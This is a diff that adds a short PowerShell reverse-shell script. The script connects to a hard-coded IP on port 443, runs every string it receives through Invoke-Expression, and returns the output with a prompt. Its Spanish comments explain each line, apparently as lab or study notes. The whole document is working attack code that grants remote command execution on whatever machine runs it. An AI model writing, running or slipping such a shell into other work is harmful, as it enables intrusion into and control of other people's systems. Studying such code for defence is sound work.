@@ -1,0 +1,13 @@
+$client = New-Object System.Net.Sockets.TCPClient('192.168.121.132',443);							# Se le asigna la IP y puertos de la máquina objetivo
+$stream = $client.GetStream();																		# 
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)											# Bucle while seguido de una llamada de cierre de conexión con el cliente
+{
+ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);					# Lee 
+ $sendback = (iex $data 2>&1 | Out-String );														# iex (Invoke-Expression) → Ejecuta cualquier string que recibe como comando
+ $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';												# Envía respuesta
+ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+ $stream.Write($sendbyte,0,$sendbyte.Length);
+ $stream.Flush();
+}
+$client.Close();
